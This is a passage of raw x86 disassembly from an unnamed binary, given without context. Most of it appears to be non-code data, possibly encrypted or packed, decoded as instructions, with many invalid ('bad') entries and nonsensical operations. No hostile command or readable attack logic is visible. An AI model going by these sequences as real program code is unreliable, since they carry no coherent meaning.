  41d598:	mov    ecx,0x7d738cb1
  41d59d:	ins    DWORD PTR es:[edi],dx
  41d59e:	enter  0x9fc6,0x26
  41d5a2:	jb     0x41d5a7
  41d5a4:	test   eax,0xb956bb17
  41d5a9:	hlt    
  41d5aa:	test   al,0x37
  41d5ac:	test   al,0x7e
  41d5ae:	fnstenv [ecx-0x6a]
  41d5b1:	mov    cl,0x6a
  41d5b3:	push   0xffffffce
  41d5b5:	or     BYTE PTR [edx],bl
  41d5b7:	xlat   BYTE PTR ds:[ebx]
  41d5b8:	out    dx,eax
  41d5b9:	add    eax,0x9321d7aa
  41d5be:	scas   al,BYTE PTR es:[edi]
  41d5bf:	adc    DWORD PTR [esi],esp
  41d5c1:	jge    0x41d5e6
  41d5c3:	fidiv  WORD PTR [edi]
  41d5c5:	leave  
  41d5c6:	hlt    
  41d5c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5c8:	cmp    ax,0x1fc8
  41d5cc:	mov    dh,cl
  41d5ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5cf:	(bad)  
  41d5d0:	and    DWORD PTR [eax],ebx
  41d5d2:	and    DWORD PTR [ecx-0x18],esi
  41d5d5:	(bad)  [ebx+0x7]
  41d5d8:	cmc    
  41d5d9:	enter  0x301a,0x40
  41d5dd:	adc    BYTE PTR [edx+0x0],al
  41d5e0:	jno    0x41d648
  41d5e2:	jp     0x41d652
  41d5e4:	dec    eax
  41d5e5:	aam    0x41
  41d5e7:	add    BYTE PTR [esp+edx*8-0x12f7ffbf],ch
  41d5ee:	adc    al,BYTE PTR [edi]
  41d5f0:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  41d5f7:	ins    BYTE PTR es:[edi],dx
  41d5f8:	push   0x49657557
  41d5fd:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  41d603:	push   edi
  41d604:	ins    BYTE PTR es:[edi],dx
  41d605:	inc    edx
  41d606:	push   0x76666a73
  41d60b:	inc    edx
  41d60c:	jo     0x41d657
  41d60e:	dec    ebp
  41d60f:	dec    ebp
  41d610:	pop    edx
  41d611:	jp     0x41d66d
  41d613:	jbe    0x41d65b
  41d615:	pop    ecx
  41d616:	jo     0x41d690
	...
  41d62c:	inc    ebp
  41d62d:	push   edx
  41d62e:	jb     0x41d6a4
  41d630:	inc    esi
  41d631:	je     0x41d674
  41d633:	inc    esi
  41d634:	jae    0x41d6ac
  41d636:	dec    ebx
  41d637:	gs inc edx
  41d639:	inc    bx
  41d63b:	push   ebp
  41d63c:	jno    0x41d6b4
  41d63e:	ja     0x41d6a7
  41d640:	dec    edi
  41d641:	dec    esp
  41d642:	dec    ebp
  41d643:	inc    edx
  41d644:	jno    0x41d6b7
  41d646:	jae    0x41d69b
  41d648:	dec    eax
  41d649:	inc    ebp
  41d64a:	inc    esp
  41d64b:	inc    esp
  41d64c:	push   ecx
  41d64d:	dec    edx
  41d64e:	ins    BYTE PTR es:[edi],dx
  41d64f:	dec    ebx
  41d650:	jbe    0x41d6c0
  41d652:	pop    eax
  41d653:	jbe    0x41d6a0
  41d655:	inc    ecx
  41d656:	fs gs jno 0x41d6c7
  41d65a:	push   ebx
  41d65b:	inc    ecx
  41d65c:	add    BYTE PTR [eax],al
  41d65e:	inc    ebx
  41d65f:	outs   dx,BYTE PTR ds:[esi]
  41d660:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  41d664:	push   edx
  41d665:	push   ecx
  41d666:	push   0x74000064
  41d66b:	jne    0x41d6e2
  41d66d:	ins    DWORD PTR es:[edi],dx
  41d66e:	push   ecx
  41d66f:	push   eax
  41d670:	jo     0x41d6ec
  41d672:	addr16 jo 0x41d6cb
  41d675:	pop    eax
  41d676:	add    BYTE PTR [eax],al
  41d678:	push   ecx
  41d679:	pop    ecx
  41d67a:	inc    ebx
  41d67b:	inc    edx
  41d67c:	outs   dx,BYTE PTR ds:[esi]
  41d67d:	popa   
  41d67e:	imul   eax,DWORD PTR [edx+0x61],0x6b
  41d682:	jne    0x41d6f2
  41d684:	dec    ebx
  41d685:	add    BYTE PTR [ecx+0x45],bh
  41d688:	bound  ebp,QWORD PTR [ecx+0x46]
  41d68b:	dec    ecx
  41d68c:	ja     0x41d6d3
  41d68e:	dec    eax
  41d68f:	inc    ebp
  41d690:	inc    edx
  41d691:	push   ebx
  41d692:	add    BYTE PTR [eax],al
  41d694:	je     0x41d6f9
  41d696:	bound  esp,QWORD PTR [edi+0x78]
  41d699:	dec    eax
  41d69a:	bound  edx,QWORD PTR [ebx+0x43]
  41d69d:	pop    eax
  41d69e:	outs   dx,DWORD PTR ds:[esi]
  41d69f:	push   0x4355
  41d6a4:	inc    edi
  41d6a5:	gs ins BYTE PTR es:[edi],dx
  41d6a7:	dec    esp
  41d6a8:	js     0x41d712
  41d6aa:	inc    edx
  41d6ab:	js     0x41d6f3
  41d6ad:	arpl   WORD PTR [eax],ax
  41d6af:	add    BYTE PTR [eax],al
  41d6b1:	add    BYTE PTR [eax],al
  41d6b3:	add    BYTE PTR [edx+0x70],cl
  41d6b6:	jb     0x41d730
  41d6b8:	outs   dx,DWORD PTR ds:[esi]
  41d6b9:	pop    eax
  41d6ba:	dec    ebx
  41d6bb:	push   esp
  41d6bc:	dec    esp
  41d6bd:	jns    0x41d70a
  41d6bf:	js     0x41d739
  41d6c1:	outs   dx,BYTE PTR ds:[esi]
  41d6c2:	pop    ecx
  41d6c3:	jae    0x41d733
  41d6c5:	push   0x43644448
  41d6ca:	arpl   WORD PTR [edx+0x55],sp
  41d6cd:	push   0x42504e67
  41d6d2:	push   ebp
  41d6d3:	je     0x41d74a
  41d6d5:	addr16 dec edi
  41d6d7:	dec    esp
  41d6d8:	inc    edx
  41d6d9:	ins    DWORD PTR es:[edi],dx
  41d6da:	inc    esi
  41d6db:	inc    esi
  41d6dc:	inc    esi
  41d6dd:	arpl   WORD PTR [edx+0x47],bx
  41d6e0:	push   ebp
  41d6e1:	inc    ebx
  41d6e2:	popa   
  41d6e3:	push   edx
  41d6e4:	dec    esp
  41d6e5:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  41d6ec:	push   ecx
  41d6ed:	push   ebx
  41d6ee:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  41d6f5:	dec    edx
  41d6f6:	jns    0x41d761
  41d6f8:	push   edx
  41d6f9:	inc    ebx
  41d6fa:	jo     0x41d771
  41d6fc:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  41d700:	fs push ebx
  41d702:	inc    ebx
  41d703:	push   ebp
  41d704:	push   eax
  41d705:	ja     0x41d781
  41d707:	jp     0x41d756
  41d709:	push   esi
  41d70a:	arpl   WORD PTR gs:[ecx+0x45],si
  41d70e:	dec    edx
  41d70f:	dec    esi
  41d710:	data16 ja 0x41d761
  41d713:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
  41d71a:	dec    esp
  41d71b:	cmp    ebx,ebp
  41d71d:	dec    esp
  41d71e:	lods   eax,DWORD PTR ds:[esi]
  41d71f:	out    dx,al
  41d720:	mov    ebp,0xa53ddffb
  41d725:	js     0x41d6e0
  41d727:	xor    eax,0x94df3608
  41d72c:	xchg   esi,eax
  41d72d:	add    DWORD PTR [eax],eax
  41d72f:	lods   eax,DWORD PTR ds:[esi]
  41d730:	add    BYTE PTR [eax],al
  41d732:	add    BYTE PTR [ebx+0x342c3cb2],ah
  41d738:	fmul   DWORD PTR [ebx-0x5d5bc5aa]
  41d73e:	dec    ebx
  41d73f:	fucomp st(0)
  41d741:	hlt    
  41d742:	fimul  WORD PTR [edx]
  41d744:	in     al,0x71
  41d746:	imul   esi,DWORD PTR [ebx+0x6249070d],0x55
  41d74d:	mov    cl,cl
  41d74f:	cmp    DWORD PTR [edi-0x13],0xd2380bba
  41d756:	or     esp,DWORD PTR [esi+0x7e766412]
  41d75c:	and    eax,esp
  41d75e:	or     BYTE PTR [ebx],ah
  41d760:	mov    DWORD PTR [esi*1-0x3c017eca],ecx
  41d767:	rol    DWORD PTR [esi*1+0x46400596],0xce
  41d76f:	push   ds
  41d770:	std    
  41d771:	jecxz  0x41d7d9
  41d773:	mov    esp,0x46aa89f1
  41d778:	loope  0x41d7e9
  41d77a:	ret    
  41d77b:	adc    esp,DWORD PTR [edi+0x3a48d567]
  41d781:	xor    eax,0xbfd12409
  41d786:	dec    edi
  41d787:	mov    edx,0x7281d3c1
  41d78c:	ds pop edx
  41d78e:	adc    eax,0x1d122fdc
  41d793:	repnz xchg ebp,eax
  41d795:	pop    ecx
  41d796:	imul   edi,edx,0xd0b9e0f8
  41d79c:	dec    esi
  41d79d:	inc    edi
  41d79e:	(bad)  
  41d79f:	mov    ebx,0xe87eead5
  41d7a4:	adc    al,0x9a
  41d7a6:	push   edi
  41d7a7:	mov    DWORD PTR [ecx+0x6d],ebp
  41d7aa:	rcl    DWORD PTR [esi],cl
  41d7ac:	push   edx
  41d7ad:	call   0xeecf:0x77d5cd73
  41d7b4:	daa    
  41d7b5:	aad    0x87
  41d7b7:	rcl    BYTE PTR [edx+0x19],cl
  41d7ba:	mov    ss,ebp
  41d7bc:	fisub  WORD PTR [eax+0x3f]
  41d7bf:	mov    ds:0xc7871118,al
  41d7c4:	dec    ecx
  41d7c5:	mov    al,ds:0x30b77dbb
  41d7ca:	mov    al,ds:0x3206d9c6
  41d7cf:	dec    eax
  41d7d0:	lea    edi,[esp+eax*2-0x33]
  41d7d4:	mov    ecx,0x11f9e88f
  41d7d9:	mov    eax,ds:0x6bbef76c
  41d7de:	dec    ebx
  41d7df:	popf   
	...
  41d7e8:	add    BYTE PTR [eax],al
  41d7ea:	add    BYTE PTR [eax],ch
  41d7ec:	mov    dl,0xa5
  41d7ee:	push   edx
  41d7ef:	mov    edi,0x7cfaff57
  41d7f4:	xlat   BYTE PTR fs:[ebx]
  41d7f6:	push   esi
  41d7f7:	dec    DWORD PTR [edi+ebx*2]
  41d7fa:	retf   0x9741
  41d7fd:	add    DWORD PTR [eax],eax
  41d7ff:	lods   eax,DWORD PTR ds:[esi]
  41d800:	add    BYTE PTR [eax],al
  41d802:	add    BYTE PTR ds:0xf4084b68,bl
  41d808:	loop   0x41d824
  41d80a:	loopne 0x41d7e6
  41d80c:	or     DWORD PTR [esi],esp
  41d80e:	xor    DWORD PTR [edi+eax*4+0xfff20b8],0xffffffec
  41d816:	hlt    
  41d817:	pop    ebp
  41d818:	shl    BYTE PTR [ebx],1
  41d81a:	sub    cl,BYTE PTR [ebx+0x295e15af]
  41d820:	(bad)  
  41d822:	cld    
  41d823:	adc    cl,0xac
  41d826:	nop
  41d827:	sahf   
  41d828:	fimul  WORD PTR [esi+ebx*2-0x24b1868d]
  41d82f:	popa   
  41d830:	les    edi,FWORD PTR gs:[ecx+0x43]
  41d834:	push   esi
  41d835:	or     DWORD PTR [eax-0x4f],eax
  41d838:	cdq    
  41d839:	inc    ebx
  41d83a:	out    0xaf,al
  41d83c:	xlat   BYTE PTR ds:[ebx]
  41d83d:	sbb    eax,0x54515f8c
  41d842:	loop   0x41d832
  41d844:	(bad)  
  41d845:	into   
  41d846:	mov    cl,BYTE PTR [esi+0x77]
  41d849:	aad    0x83
  41d84b:	out    dx,eax
  41d84c:	push   0x75d67d8c
  41d851:	dec    esi
  41d852:	lds    eax,FWORD PTR [esi+0x6c]
  41d855:	outs   dx,BYTE PTR ds:[esi]
  41d856:	loopne 0x41d7fe
  41d858:	or     al,0xfe
  41d85a:	adc    esp,DWORD PTR [ecx+0x66]
  41d85d:	and    DWORD PTR [ebx-0x64ceade5],0x678bc231
  41d867:	addr16 xor eax,0x58275a6
  41d86d:	fcomip st,st(5)
  41d86f:	cmp    al,0x5
  41d871:	mov    bh,0x8
  41d873:	and    eax,DWORD PTR [esi-0x45]
  41d876:	fdiv   st(0),st
  41d878:	dec    eax
  41d879:	cs jp  0x41d8ed
  41d87c:	mov    ds:0x20c11104,al
  41d881:	xlat   BYTE PTR ds:[ebx]
  41d882:	aaa    
  41d883:	xor    al,0x17
  41d885:	add    DWORD PTR [edi+eiz*8+0xb],esi
  41d889:	pop    esi
  41d88a:	push   0x1d
  41d88c:	mov    dh,0x9
  41d88e:	jp     0x41d821
  41d890:	cwde   
  41d891:	call   0xf4d2:0xa216ad05
  41d898:	pop    ss
  41d899:	dec    edx
  41d89a:	mov    BYTE PTR [esi+0x380ab3a3],dl
  41d8a0:	loope  0x41d866
  41d8a2:	xchg   ecx,eax
  41d8a3:	add    esi,DWORD PTR [ebx-0x37]
  41d8a6:	xchg   ebp,eax
  41d8a7:	div    BYTE PTR [edi]
  41d8a9:	inc    ebp
  41d8aa:	outs   dx,DWORD PTR ds:[esi]
  41d8ab:	mov    ecx,0x7798aee6
	...
  41d8b8:	add    BYTE PTR [eax],al
  41d8ba:	add    BYTE PTR [ebx-0x7e80ab],dh
  41d8c0:	stos   DWORD PTR es:[edi],eax
  41d8c1:	push   DWORD PTR [edi-0x42]
  41d8c4:	xchg   esi,eax
  41d8c5:	push   0x66e4cc57
  41d8ca:	inc    esi
  41d8cb:	out    dx,al
  41d8cc:	xchg   edi,eax
  41d8cd:	add    DWORD PTR [eax],eax
  41d8cf:	lods   eax,DWORD PTR ds:[esi]
  41d8d0:	add    BYTE PTR [eax],al
  41d8d2:	add    BYTE PTR [esi+0x60],dl
  41d8d5:	mov    esi,0x8849f1d
  41d8da:	inc    esp
  41d8db:	jno    0x41d8cd
  41d8dd:	repnz pop edi
  41d8df:	add    DWORD PTR [esi-0x66],edi
  41d8e2:	xlat   BYTE PTR ds:[ebx]
  41d8e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8e4:	xchg   edi,eax
  41d8e5:	je     0x41d95b
  41d8e7:	or     cl,al
  41d8e9:	jp     0x41d902
  41d8eb:	dec    BYTE PTR [ecx]
  41d8ed:	xchg   edx,eax
  41d8ee:	xchg   edx,eax
  41d8ef:	sar    BYTE PTR [edx+eax*8+0x23],0xbc
  41d8f4:	test   al,0x64
  41d8f6:	mov    eax,0xb183fb
  41d8fb:	add    eax,0x80c42364
  41d900:	int3   
  41d901:	sbb    eax,0xb5e6c99d
  41d906:	je     0x41d8c1
  41d908:	ret    0x4990
  41d90b:	out    dx,al
  41d90c:	or     esi,esp
  41d90e:	cdq    
  41d90f:	imul   ecx,esp,0x3e4650d8
  41d915:	push   edi
  41d916:	leave  
  41d917:	std    
  41d918:	jp     0x41d8b5
  41d91a:	(bad)  
  41d91e:	jmp    0x2ae9:0xed23fcfc
  41d925:	cmc    
  41d926:	or     eax,0xa02e5a02
  41d92b:	jb     0x41d8f5
  41d92d:	cwde   
  41d92e:	fdivr  DWORD PTR [ecx+0x4063fcc6]
  41d934:	popa   
  41d935:	sti    
  41d936:	xor    al,0x38
  41d938:	push   0xa51e3588
  41d93d:	push   ebp
  41d93e:	clc    
  41d93f:	sahf   
  41d940:	pop    ds
  41d941:	cmc    
  41d942:	and    eax,0xb2735f7a
  41d947:	(bad)  
  41d948:	sti    
  41d949:	pop    esi
  41d94a:	jne    0x41d8f4
  41d94c:	in     eax,0xd6
  41d94e:	pcmpgtd mm1,mm0
  41d951:	(bad)  
  41d953:	lds    ebp,FWORD PTR [esi+0x58f4e0d5]
  41d959:	add    DWORD PTR [edx+0x6e],ebp
  41d95c:	cli    
  41d95d:	adc    al,0xf5
  41d95f:	mov    al,ds:0xe1dea9c0
  41d964:	jp     0x41d9d5
  41d966:	and    al,0xa6
  41d968:	jne    0x41d9c5
  41d96a:	adc    eax,0x52bd519b
  41d96f:	lods   al,BYTE PTR ds:[esi]
  41d970:	jg     0x41d920
  41d972:	mov    dl,0x6d
  41d974:	retf   0x8d67
  41d977:	push   bx
  41d979:	arpl   ax,ax
  41d97b:	in     eax,dx
  41d97c:	xchg   esi,eax
  41d97d:	jmp    0x41d947
  41d97f:	mov    esp,0x0
  41d984:	add    BYTE PTR [eax],al
  41d986:	add    BYTE PTR [eax],al
  41d988:	add    BYTE PTR [eax],al
  41d98a:	add    BYTE PTR [eax],bh
  41d98c:	(bad)  
  41d98d:	cmp    ah,BYTE PTR [esi+edi*8]
  41d990:	in     al,dx
  41d991:	fimul  WORD PTR ds:[edi-0x6d53942b]
  41d998:	dec    ebp
  41d999:	jne    0x41d9d0
  41d99b:	fwait
  41d99c:	cwde   
  41d99d:	add    DWORD PTR [eax],eax
  41d99f:	lods   eax,DWORD PTR ds:[esi]
  41d9a0:	add    BYTE PTR [eax],al
  41d9a2:	add    BYTE PTR [esi+eiz*4+0x69],dl
  41d9a6:	arpl   sp,di
  41d9a8:	dec    eax
  41d9a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9aa:	jne    0x41d9c9
  41d9ac:	ret    
  41d9ad:	push   ds
  41d9ae:	aam    0xb8
  41d9b0:	into   
  41d9b1:	and    esp,DWORD PTR [esi]
  41d9b3:	mov    bl,0x47
  41d9b5:	dec    ebx
  41d9b6:	gs jg  0x41d9e1
  41d9b9:	xchg   al,dl
  41d9bb:	into   
  41d9bc:	cmp    DWORD PTR [eiz*8-0x62cbc3c1],edx
  41d9c3:	mov    edi,esi
  41d9c5:	cdq    
  41d9c6:	arpl   WORD PTR [edx+edx*2-0x28be7f37],ax
  41d9cd:	mov    ah,0xe6
  41d9cf:	mov    ecx,0xafb40004
  41d9d4:	inc    edx
  41d9d5:	enter  0x8122,0xe6
  41d9d9:	inc    esi
  41d9da:	or     eax,0x8d1aa8e8
  41d9df:	int3   
  41d9e0:	mov    bh,0x5d
  41d9e2:	mov    edi,0xcc0b9aac
  41d9e7:	push   ss
  41d9e8:	not    DWORD PTR ds:0xed35e72e
  41d9ee:	sbb    bh,bh
  41d9f0:	mov    edx,0x31e611b5
  41d9f5:	out    dx,al
  41d9f6:	jmp    0x41da43
  41d9f8:	mov    WORD PTR [eax],cs
  41d9fa:	pop    ds
  41d9fb:	inc    ebx
  41d9fc:	inc    esp
  41d9fd:	sti    
  41d9fe:	mov    al,0xde
  41da00:	in     al,dx
  41da01:	clc    
  41da02:	jns    0x41d9cd
  41da04:	in     al,0xf4
  41da06:	inc    ecx
  41da07:	rol    DWORD PTR [ebx+ebp*8-0x6e2405e],1
  41da0e:	(bad)  
  41da0f:	std    
  41da10:	fbld   TBYTE PTR [ebx]
  41da12:	sbb    DWORD PTR [ebp+0x3b],0xb989ae89
  41da19:	jb     0x41da33
  41da1b:	daa    
  41da1c:	sti    
  41da1d:	or     ebp,DWORD PTR [ebx+edi*2]
  41da20:	pop    edx
  41da21:	sub    BYTE PTR [ecx+esi*4-0x45],bl
  41da25:	pop    ecx
  41da26:	sahf   
  41da27:	ins    DWORD PTR es:[edi],dx
  41da28:	test   eax,0xc33f7a54
  41da2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da2e:	add    bl,cl
  41da30:	ret    
  41da31:	in     al,dx
  41da32:	inc    ebx
  41da33:	dec    ebp
  41da34:	into   
  41da35:	xchg   edx,eax
  41da36:	push   edi
  41da37:	stc    
  41da38:	fisub  WORD PTR [esi-0x1dd1428]
  41da3e:	inc    ebx
  41da3f:	dec    edx
  41da40:	fs pop edx
  41da42:	jae    0x41da77
  41da44:	jno    0x41d9c8
  41da46:	sbb    DWORD PTR [edi],edi
  41da48:	jno    0x41da08
  41da4a:	mov    dh,0xf0
  41da4c:	cmp    BYTE PTR ds:0x83df,ah
	...
  41da5a:	add    cl,bl
  41da5c:	mov    dh,0x66
  41da5e:	sbb    ebp,DWORD PTR [edi-0x25]
  41da61:	std    
  41da62:	neg    BYTE PTR [esi]
  41da64:	sub    esp,DWORD PTR [ebx-0x23]
  41da67:	mov    al,ds:0x48bc6e9e
  41da6c:	cdq    
  41da6d:	add    DWORD PTR [eax],eax
  41da6f:	lods   eax,DWORD PTR ds:[esi]
  41da70:	add    BYTE PTR [eax],al
  41da72:	add    BYTE PTR [ecx+ebp*4],bh
  41da75:	mov    bh,0x56
  41da77:	sub    BYTE PTR [edx+0x2],0x65
  41da7b:	pop    esp
  41da7c:	sub    DWORD PTR [ebx+0x3a],esp
  41da7f:	xchg   esp,eax
  41da80:	sbb    BYTE PTR [ecx+0x79141fc2],0xa1
  41da87:	lock add BYTE PTR [edx+edx*8],dh
  41da8b:	inc    ebx
  41da8c:	call   0x86b73b0d
  41da91:	mov    esp,0x3b5e1304
  41da96:	cdq    
  41da97:	lahf   
  41da98:	pushf  
  41da99:	jl     0x41daa0
  41da9b:	ins    BYTE PTR es:[edi],dx
  41da9c:	pop    DWORD PTR [edx-0x24922ae5]
  41daa2:	jnp    0x41da64
  41daa4:	or     eax,0x40702171
  41daa9:	inc    eax
  41daaa:	inc    ebp
  41daab:	or     esp,edx
  41daad:	std    
  41daae:	push   esi
  41daaf:	cmp    edx,ebx
  41dab1:	scas   al,BYTE PTR es:[edi]
  41dab2:	data16 xor cl,BYTE PTR [edx]
  41dab5:	aam    0xff
  41dab7:	xor    bl,dh
  41dab9:	retf   0x4b7c
  41dabc:	fidivr WORD PTR [ecx-0x33]
  41dabf:	mov    bh,0x63
  41dac1:	mov    cl,0x91
  41dac3:	or     eax,0x9b20ccd0
  41dac8:	push   ebx
  41dac9:	push   esi
  41daca:	fnstsw WORD PTR [esi+0x79b872ae]
  41dad0:	call   0x16ae3542
  41dad5:	jno    0x41daec
  41dad7:	mov    ds:0xff7ede41,al
  41dadc:	ds test ah,ah
  41dadf:	adc    ebx,DWORD PTR [ebp+0x3e]
  41dae2:	fsubr  QWORD PTR [ebp+0x2c7548f7]
  41dae8:	push   es
  41dae9:	mov    WORD PTR [ebp-0x2c208872],ds
  41daef:	popa   
  41daf0:	popa   
  41daf1:	mov    edx,0x8d683bd1
  41daf6:	pop    eax
  41daf7:	mov    al,bl
  41daf9:	ins    BYTE PTR es:[edi],dx
  41dafa:	lahf   
  41dafb:	int    0x9c
  41dafd:	retf   0xa008
  41db00:	fsub   QWORD PTR [edi+0x381f35ea]
  41db06:	sbb    DWORD PTR [edi-0x6],edx
  41db09:	in     al,dx
  41db0a:	push   es
  41db0b:	sub    eax,0xf09ddd81
  41db10:	in     eax,0xdb
  41db12:	add    DWORD PTR [esi],edi
  41db14:	(bad)  
  41db15:	iret   
  41db16:	aas    
  41db17:	xor    edx,DWORD PTR [ebp-0x1a03decf]
  41db1d:	cmp    BYTE PTR [edi+0x43],ch
	...
  41db2b:	fidiv  DWORD PTR [edx]
  41db2d:	xchg   edi,eax
  41db2e:	mov    bh,bh
  41db30:	scas   eax,DWORD PTR es:[edi]
  41db31:	fbstp  TBYTE PTR [edx+0x3]
  41db34:	inc    ebp
  41db35:	mov    ds:0x9876715c,eax
  41db3a:	dec    ecx
  41db3b:	cmc    
  41db3c:	cdq    
  41db3d:	add    DWORD PTR [eax],eax
  41db3f:	lods   eax,DWORD PTR ds:[esi]
  41db40:	add    BYTE PTR [eax],al
  41db42:	add    BYTE PTR [ebp+0x48],cl
  41db45:	loop   0x41db2b
  41db47:	jnp    0x41db01
  41db49:	call   0x2875:0xb0030a67
  41db50:	mov    cl,0xdf
  41db52:	mov    ah,bh
  41db54:	cdq    
  41db55:	pop    ss
  41db56:	push   ebx
  41db57:	or     edi,DWORD PTR [ecx]
  41db59:	outs   dx,DWORD PTR ds:[esi]
  41db5a:	out    0xae,al
  41db5c:	push   0x6ccad926
  41db61:	xor    BYTE PTR ds:0xf0dbad29,ch
  41db67:	fsub   st(1),st
  41db69:	scas   eax,DWORD PTR es:[edi]
  41db6a:	dec    ebp
  41db6b:	inc    esp
  41db6c:	and    eax,0xaa0be840
  41db71:	pop    ecx
  41db72:	ja     0x41db56
  41db74:	inc    edx
  41db75:	sti    
  41db76:	push   ebp
  41db77:	fistp  WORD PTR [esi+0x77d809f4]
  41db7d:	xor    DWORD PTR ss:[bx],0xea375586
  41db85:	mov    bl,0xe4
  41db87:	xor    cl,ah
  41db89:	imul   esp,DWORD PTR [edi],0xffffffd8
  41db8c:	aas    
  41db8d:	dec    esi
  41db8e:	xchg   edi,eax
  41db8f:	lods   al,BYTE PTR ds:[esi]
  41db90:	mov    eax,ds:0x259e7aea
  41db95:	fld    TBYTE PTR [esp+ebx*1+0x66]
  41db99:	loope  0x41dc09
  41db9b:	dec    ecx
  41db9c:	ss jnp 0x41dbf0
  41db9f:	call   0x7f649ccb
  41dba4:	les    ebp,FWORD PTR [eax]
  41dba6:	mov    esi,0x51d1bfeb
  41dbab:	lahf   
  41dbac:	and    eax,0xbbc48c89
  41dbb1:	sub    DWORD PTR [edi+eiz*2-0x4293fe3b],esi
  41dbb8:	push   ss
  41dbb9:	jno    0x41db6f
  41dbbb:	cld    
  41dbbc:	imul   ecx,DWORD PTR ds:0x1aec91d5,0x8ac3a8ca
  41dbc6:	or     eax,DWORD PTR [ebp-0x6bab167a]
  41dbcc:	aad    0xaf
  41dbce:	jbe    0x41db7d
  41dbd0:	rdpmc  
  41dbd2:	add    al,BYTE PTR [edi+0x5772294b]
  41dbd8:	rol    BYTE PTR [ebp+0x210ff32f],1
  41dbde:	mov    edi,0x76a954b9
  41dbe3:	mov    ecx,0xb0a8d819
  41dbe8:	jne    0x41db89
  41dbea:	test   eax,0x5448ae97
  41dbef:	in     eax,dx
	...
  41dbf8:	add    BYTE PTR [eax],al
  41dbfa:	add    BYTE PTR [eax-0x1c],cl
  41dbfd:	add    ebx,DWORD PTR [ebx-0x8270051]
  41dc03:	pop    esi
  41dc04:	sub    BYTE PTR [eax-0x76f96871],bl
  41dc0a:	retf   0x9aa2
  41dc0d:	add    DWORD PTR [eax],eax
  41dc0f:	lods   eax,DWORD PTR ds:[esi]
  41dc10:	add    BYTE PTR [eax],al
  41dc12:	add    dh,ch
  41dc14:	mov    fs,ecx
  41dc16:	inc    ebx
  41dc17:	repnz cmp al,0x4f
  41dc1a:	pop    esp
  41dc1b:	sbb    al,0x94
  41dc1d:	jmp    0x41dba7
  41dc1f:	(bad)  
  41dc20:	xchg   edi,eax
  41dc21:	test   eax,0x9bc7302b
  41dc26:	ins    BYTE PTR es:[edi],dx
  41dc27:	cs jbe 0x41dc76
  41dc2a:	xchg   esp,eax
  41dc2b:	cmp    bl,BYTE PTR [eax-0x40]
  41dc2e:	jb     0x41dc56
  41dc30:	hlt    
  41dc31:	lea    edx,[ebx+0x6499f269]
  41dc37:	pop    es
  41dc38:	stos   DWORD PTR es:[edi],eax
  41dc39:	cmp    BYTE PTR [ecx-0x329d4282],ah
  41dc3f:	jne    0x41dcba
  41dc41:	sti    
  41dc42:	test   BYTE PTR [ecx-0x39],cl
  41dc45:	add    dl,bl
  41dc47:	jle    0x41dc9d
  41dc49:	mov    bl,0xb7
  41dc4b:	push   ebp
  41dc4c:	fidiv  WORD PTR [edi-0x3]
  41dc4f:	inc    edi
  41dc51:	hlt    
  41dc52:	ret    
  41dc53:	rcr    ch,1
  41dc55:	dec    esp
  41dc56:	cmp    eax,0xdf2436ce
  41dc5b:	aad    0xde
  41dc5d:	gs int 0x6d
  41dc60:	les    ebp,FWORD PTR [ecx+0x53af76aa]
  41dc66:	jae    0x41dca5
  41dc68:	xchg   ebp,eax
  41dc69:	xor    ch,BYTE PTR [ebp+0x1473995b]
  41dc6f:	jecxz  0x41dcd5
  41dc71:	adc    BYTE PTR [ecx],bl
  41dc73:	mov    esp,0x2d79fca6
  41dc78:	pop    edi
  41dc79:	inc    ecx
  41dc7a:	call   0x8658:0x6f1141ef
  41dc81:	dec    edx
  41dc82:	pusha  
  41dc83:	shl    DWORD PTR [ebx+edi*4],1
  41dc86:	in     al,0x1c
  41dc88:	ds xchg esi,eax
  41dc8a:	and    eax,eax
  41dc8c:	push   esi
  41dc8d:	out    0x96,al
  41dc8f:	mov    cl,0xd4
  41dc91:	or     eax,0x6ddca38e
  41dc96:	mov    ecx,eax
  41dc98:	mov    DWORD PTR [ebx-0x31307f8],ebx
  41dc9e:	pushf  
  41dc9f:	int3   
  41dca0:	sub    esi,ecx
  41dca2:	das    
  41dca3:	mov    edx,0x1a417fb5
  41dca8:	bound  edi,QWORD PTR [edi+0x3d]
  41dcab:	rcl    ebp,1
  41dcad:	leave  
  41dcae:	adc    bl,BYTE PTR ds:0x9c9c31d6
  41dcb4:	into   
  41dcb5:	cwde   
  41dcb6:	cwde   
  41dcb7:	xor    al,0xac
  41dcb9:	push   ds
  41dcba:	(bad)  
  41dcbb:	cdq    
  41dcbc:	cli    
  41dcbd:	sub    eax,0xda70
	...
  41dcca:	add    BYTE PTR [edx+0x4],dl
  41dccd:	mov    ds:0x72a6f682,al
  41dcd2:	aam    0x6d
  41dcd4:	xor    dh,BYTE PTR [edx]
  41dcd6:	and    eax,0x6fd73af9
  41dcdb:	dec    edi
  41dcdc:	fwait
  41dcdd:	add    DWORD PTR [eax],eax
  41dcdf:	lods   eax,DWORD PTR ds:[esi]
  41dce0:	add    BYTE PTR [eax],al
  41dce2:	add    BYTE PTR [ebx],dh
  41dce4:	xlat   BYTE PTR ds:[ebx]
  41dce5:	pushf  
  41dce6:	in     eax,dx
  41dce7:	push   0x244ecd7d
  41dcec:	stos   DWORD PTR es:[edi],eax
  41dced:	dec    eax
  41dcee:	lahf   
  41dcef:	xchg   ecx,eax
  41dcf0:	int3   
  41dcf1:	and    al,BYTE PTR [ebp+0x58]
  41dcf4:	inc    esi
  41dcf5:	mov    ebx,0x653f25b1
  41dcfa:	lods   eax,DWORD PTR ds:[esi]
  41dcfb:	adc    ecx,ebx
  41dcfd:	(bad)  
  41dcfe:	outs   dx,BYTE PTR ds:[esi]
  41dcff:	out    dx,eax
  41dd00:	cmp    eax,DWORD PTR [edi]
  41dd02:	jnp    0x41dd3f
  41dd04:	int3   
  41dd05:	lahf   
  41dd06:	mov    dh,0xb3
